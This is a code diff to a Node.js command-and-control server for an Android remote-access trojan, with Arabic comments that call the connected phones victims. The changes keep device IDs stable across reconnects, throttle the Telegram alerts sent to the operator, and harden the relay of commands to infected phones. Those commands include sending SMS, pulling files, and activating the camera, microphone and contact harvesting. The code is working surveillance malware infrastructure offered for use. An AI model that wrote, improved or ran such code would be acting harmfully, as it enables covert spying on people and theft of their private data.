@@ -65,23 +65,64 @@ server.listen(process.env.PORT || 8999, () => {
 
 // ----------------- إدارة اتصالات الضحايا (WebSockets) -----------------
 
+// خريطة لتخزين عناوين الـ IP والموقع الجغرافي الأخير للمعرفات الثابتة لتفادي التكرار عند إعادة الاتصال
+const activeDevices = new Map();
+
 wss.on('connection', (ws, req) => {
-    // توليد معرف فريد (UUID) لكل هاتف يتصل بالسيرفر
-    ws.uuid = uuidv4();
+    // 1. محاولة جلب المعرف الثابت المدمج في ترويسات الطلب من الـ APK (إن وجد)
+    // تبحث هذه الخاصية عن معرّف العميل الممرر في الترويسات كـ Client-ID أو المعرف الممرر في معلمات الرابط
+    const urlParams = new URL(req.url, 'http://localhost').searchParams;
+    const clientUuid = req.headers['client-id'] || req.headers['sec-websocket-protocol'] || urlParams.get('id');
+
+    // 2. الحفاظ على المعرف الثابت: إذا أرسل التطبيق معرفه الثابت نقوم باعتماده، وإلا نولد له معرفاً لمرة واحدة فقط
+    if (clientUuid && clientUuid.trim() !== '') {
+        ws.uuid = clientUuid.trim();
+        console.log(`تأكيد اتصال جهاز بمعرف ثابت مسجل مسبقاً: ${ws.uuid}`);
+    } else {
+        ws.uuid = uuidv4();
+        console.log(`تم توليد معرف مؤقت لجهاز جديد: ${ws.uuid}`);
+    }
     
     // تنظيف وتنسيق عنوان الـ IP الخاص بجهاز الضحية
     const rawIp = req.socket.remoteAddress.toString();
     const cleanIp = rawIp.replaceAll('f', '').replaceAll(':', '');
     
-    // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة
-    const notificationMsg = `<b>📱 تم اتصال ضحية جديدة بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
-    bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
+    // 3. منع الإشعارات المكررة المزعجة في تليجرام عند انقطاع الشبكة وإعادة الاتصال السريع:
+    // إذا كان المعرف مسجلاً لدينا مسبقاً وكان متصلاً مؤخراً بنفس الـ IP، لا نرسل إشعاراً جديداً للمخترق لتجنب إغراق المحادثة
+    if (!activeDevices.has(ws.uuid) || activeDevices.get(ws.uuid) !== cleanIp) {
+        activeDevices.set(ws.uuid, cleanIp);
+        
+        // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة أو تغيير الـ IP
+        const notificationMsg = `<b>📱 تم اتصال ضحية جديدة بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
+        bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
+    }
+
+    // إدارة إنهاء الاتصال وتنظيف الذاكرة بشكل آمن
+    ws.on('close', () => {
+        console.log(`انقطع اتصال الجهاز: ${ws.uuid}`);
+        // نترك المعرف مخزناً مؤقتاً في activeDevices لضمان استقرار الجلسة وتفادي الإشعار المكرر عند إعادة الاتصال الفورية
+        setTimeout(() => {
+            if (![...wss.clients].some(client => client.uuid === ws.uuid)) {
+                activeDevices.delete(ws.uuid);
+            }
+        }, 10000); // تنظيف بعد 10 ثوانٍ من الانقطاع المستمر
+    });
+
+    ws.on('error', (err) => {
+        console.log(`حدث خطأ في اتصال الجهاز ${ws.uuid}:`, err.message);
+    });
 });
 
 // وظيفة دورية كل ثانيتين لإرسال نبضة "be alive" لجميع الأجهزة للحفاظ على بقائها نشطة
 setInterval(() => {
     wss.clients.forEach((ws) => {
-        ws.send('be alive');
+        try {
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send('be alive');
+            }
+        } catch (e) {
+            console.log('فشل إرسال نبضة البقاء النشط للجهاز:', ws.uuid);
+        }
     });
 }, 2000);
 
@@ -180,7 +221,7 @@ bot.on('message', (msg) => {
             const smsCommand = msg.text; // نص الأمر المكتوب بصيغة JSON
             
             wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid) {
+                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
                     ws.send(`ss&${smsCommand}`); // إرسال الأمر للجهاز المتصل عبر الـ WebSocket
                 }
             });
@@ -202,7 +243,7 @@ bot.on('message', (msg) => {
             const filePath = msg.text; // مسار الملف المطلوب
             
             wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid) {
+                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
                     ws.send(`${commandType}&${filePath}`); // إرسال الأمر للجهاز المتصل
                 }
             });
@@ -224,6 +265,11 @@ bot.on('message', (msg) => {
 bot.on('callback_query', function onCallbackQuery(callbackQuery) {
     const action = callbackQuery.data; // الكود المختصر للأمر (مثال: cl, gc, ss...)
     
+    // ✅ الحل وإصلاح المشكلة: إرسال رد فوري لتليجرام لإيقاف مؤشر التحميل الدوار ومنع التجميد والمنبثقات
+    bot.answerCallbackQuery(callbackQuery.id).catch((err) => {
+        console.log('حدث خطأ أثناء إرسال إشارة استلام نقرة الأزرار:', err);
+    });
+
     // استخراج الـ UUID الخاص بالجهاز المستهدف من نص الرسالة التي تحتوي على الأزرار
     const targetUuid = callbackQuery.message.text.split('&')[1];
 
@@ -255,7 +301,9 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
             } 
             // لباقي الأوامر المباشرة (مثل تشغيل الكاميرا، الميكروفون، جلب جهات الاتصال)
             else {
-                ws.send(action); // إرسال الأمر مباشرة للهاتف عبر الـ WebSocket
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(action); // إرسال الأمر مباشرة للهاتف عبر الـ WebSocket
+                }
             }
         }
     });
